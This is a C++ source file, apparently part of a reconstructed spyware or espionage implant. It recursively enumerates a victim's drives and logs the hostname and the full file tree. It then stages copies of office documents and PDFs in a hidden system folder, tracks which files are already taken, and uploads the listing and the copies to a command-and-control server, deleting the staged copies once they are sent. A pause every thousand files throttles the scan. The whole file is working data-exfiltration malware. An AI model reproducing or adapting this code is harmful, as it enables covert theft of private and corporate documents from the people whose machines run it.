// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "recursive.hpp"

#include <time.h>
#include "StdAfx.hpp"
#include "c2.hpp"
#include "recursive.hpp"

#ifndef NO_HASH_MD5
	#include "md5++.hpp"
#endif

BOOL SendUEnumFSToC2()
{
	HANDLE hFile = CreateFile(g_szUEnumFS, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
		return FALSE;
	
	CloseHandle(hFile);
	
	time_t tTime;
	time(&tTime);
	struct tm *lpLocalTime = localtime(&tTime);
	
	CHAR szUFileList[260];
	sprintf(szUFileList,
		"UFileList-%02u%02u-%02u%02u%02u.ini",
		lpLocalTime->tm_mon + 1,
		lpLocalTime->tm_mday,
		lpLocalTime->tm_hour,
		lpLocalTime->tm_min,
		lpLocalTime->tm_sec
	);
	
	return SendFileToC2(g_szUEnumFS, szUFileList);
}

void RecursiveFileSearch(const char *lpszUnit, FILE *f)
{
	int nFileIndex = 0;
	int nDirIndex = 0;
#ifndef NO_HASH_MD5
	CMD5 lpMD5;
#endif
	
	CHAR szLog[268];
	sprintf(szLog, "[%s]\n", lpszUnit);
	fwrite(szLog, 1, strlen(szLog), f);
	
	CHAR FileName[260];
	sprintf(FileName, "%s*.*", lpszUnit);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile = FindFirstFile(FileName, &FindFileData);
	if (INVALID_HANDLE_VALUE != hFindFile)
	{
		do
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (_stricmp(FindFileData.cFileName, ".") && _stricmp(FindFileData.cFileName, ".."))
				{
					sprintf(szLog, "d%d=%s\n", ++nDirIndex, FindFileData.cFileName);
					fwrite(szLog, 1, strlen(szLog), f);
				}
			}
			else
			{
				sprintf(szLog, "f%d=%s\n", ++nFileIndex, FindFileData.cFileName);
				fwrite(szLog, 1, strlen(szLog), f);
				
				if (TRUE == g_bUAuto)
				{
					CHAR szFileExtLow[260] = {};
					
					char *szFileExt = strrchr(FindFileData.cFileName, '.');
					if (NULL != szFileExt)
					{
						sprintf(szFileExtLow, "%s", szFileExt + 1);
						_strlwr(szFileExtLow);
					}
					
					BOOL bAcceptedType = TRUE;
					if (TRUE == g_bUTypeLimit)
					{
						CHAR szAcceptedTypes[260];
						CHAR szFileType[260];
						
						sprintf(szAcceptedTypes, ",%s,", g_szAcceptedFileTypes);
						sprintf(szFileType, ",%s,", szFileExtLow);
						
						if (!strstr(szAcceptedTypes, szFileType))
							bAcceptedType = FALSE;
					}
					
					BOOL bAcceptedSize = TRUE;
					if (g_dwMaxFileSizeKB && (FindFileData.nFileSizeLow > g_dwMaxFileSizeKB << 10 || FindFileData.nFileSizeHigh))
						bAcceptedSize = FALSE;
					
					if (bAcceptedType && bAcceptedSize)
					{
						SYSTEMTIME SystemTime;
						FileTimeToSystemTime(&FindFileData.ftLastWriteTime, &SystemTime);
						
						char szFileTimestamp[284];
						sprintf(
							szFileTimestamp,
							"%s %d-%02d-%02d %02d:%02d:%02d:%03d",
							FindFileData.cFileName,
							SystemTime.wYear,
							SystemTime.wMonth,
							SystemTime.wDay,
							SystemTime.wHour,
							SystemTime.wMinute,
							SystemTime.wSecond,
							SystemTime.wMilliseconds
						);
						
						CHAR szUniqueFilePath[260];
#ifndef NO_HASH_MD5
						sprintf(szUniqueFilePath, "%s", lpMD5.GetStringMD5(szFileTimestamp));
#else
						sprintf(szUniqueFilePath, "%s", FindFileData.cFileName);
#endif
						Sleep(1);
						
						// Check if file has been changed
						if (!GetPrivateProfileInt("Index", szUniqueFilePath, 0, g_szUDIdx))
						{
							CHAR szTmpName[260];
							sprintf(
								szTmpName,
								"%sU%d-%02d-%02d-%02d-%02d-%s",
								g_szTmpPath,
								SystemTime.wYear,
								SystemTime.wMonth,
								SystemTime.wDay,
								SystemTime.wHour,
								SystemTime.wMinute,
								szUniqueFilePath
							);
							
							if (szFileExt)
								strcat(szTmpName, szFileExt);
							
							CHAR szFilePath[260];
							sprintf(szFilePath, "%s%s", lpszUnit, FindFileData.cFileName);
							
							Sleep(1);
							if (CopyFile(szFilePath, szTmpName, 0))
							{
								SetFileAttributes(szTmpName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
								WritePrivateProfileString("Index", szUniqueFilePath, "1", g_szUDIdx);
							}
						}
					}
				}
			}
			
			if (++g_dwScannedFile >= 1000)
			{
				g_dwScannedFile = 0;
				Sleep(9000);
			}
		}
		while (FindNextFile(hFindFile, &FindFileData));
		
		FindClose(hFindFile);
	}
	
	sprintf(szLog, "filecount=%d\n", nFileIndex);
	fwrite(szLog, 1, strlen(szLog), f);
	
	sprintf(szLog, "dircount=%d\n", nDirIndex);
	fwrite(szLog, 1, strlen(szLog), f);
	
	// Next directory
	HANDLE hFindDir = FindFirstFile(FileName, &FindFileData);
	if (INVALID_HANDLE_VALUE != hFindDir)
	{
		do
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
				&& _stricmp(FindFileData.cFileName, ".")
				&& _stricmp(FindFileData.cFileName, ".."))
			{
				sprintf(szLog, "%s%s\\", lpszUnit, FindFileData.cFileName);
				RecursiveFileSearch(szLog, f);
			}
		}
		while (FindNextFile(hFindDir, &FindFileData));
		FindClose(hFindDir);
	}
}

void ScanDevice(const char *lpszUnit)
{
	CHAR szUnitCpy[260];
	CHAR lpBuf64[292];
	
	GetPrivateProfileString("Other", "UTypeLimit", "True", lpBuf64, 64, g_szDNList);
	g_bUTypeLimit = _stricmp(lpBuf64, "True") == 0;
	
	GetPrivateProfileString("Other", "UAuto", "False", lpBuf64, 64, g_szDNList);
	g_bUAuto = _stricmp(lpBuf64, "True") == 0;

	if (TRUE == g_bUTypeLimit)
	{
		GetPrivateProfileString("Other", "Types", "doc,docx,xls,xlsx,txt,rtf,pdf", g_szAcceptedFileTypes, 64, g_szDNList);
		_strlwr(g_szAcceptedFileTypes);
	}
	
	if (TRUE == g_bUAuto)
	{
		if (TRUE == CreateDirectory(g_szTmpPath, NULL))
			SetFileAttributes(g_szTmpPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
		else if (ERROR_ALREADY_EXISTS != GetLastError())
			return;
	}
	
	g_dwScannedFile = 0;
	
	FILE *f = fopen(g_szUEnumFS, "w");
	if (NULL != f)
	{
		sprintf(lpBuf64, "[Computer]\nName=%s\nPage=%u\n", g_szHostname, GetACP());
		fwrite(lpBuf64, 1, strlen(lpBuf64), f);
		
		sprintf(lpBuf64, "[%s]\n", g_szHostname);
		fwrite(lpBuf64, 1, strlen(lpBuf64), f);
		
		strcpy(szUnitCpy, lpszUnit);
		if (strlen(szUnitCpy) > 3)
		{
			if (szUnitCpy[strlen(szUnitCpy) - 1] == '\\')
				szUnitCpy[strlen(szUnitCpy) - 1] = 0;
		}
		
		sprintf(lpBuf64, "d1=%s\ndircount=1\n", szUnitCpy);
		fwrite(lpBuf64, 1, strlen(lpBuf64), f);
		
		RecursiveFileSearch(lpszUnit, f);
		
		fclose(f);
	}
}

void SendTmpFolderToC2()
{
	CHAR szTmpPath[260];
	sprintf(szTmpPath, "%s*.*", g_szTmpPath);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile = FindFirstFile(szTmpPath, &FindFileData);
	if (INVALID_HANDLE_VALUE != hFindFile)
	{
		do
		{
			if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				CHAR szFileTmp[260];
				sprintf(szFileTmp, "%s%s", g_szTmpPath, FindFileData.cFileName);
				
				if (SendFileToC2(szFileTmp, FindFileData.cFileName))
					DeleteFile(szFileTmp);
			}
		}
		while (FindNextFile(hFindFile, &FindFileData));
		
		FindClose(hFindFile);
	}
}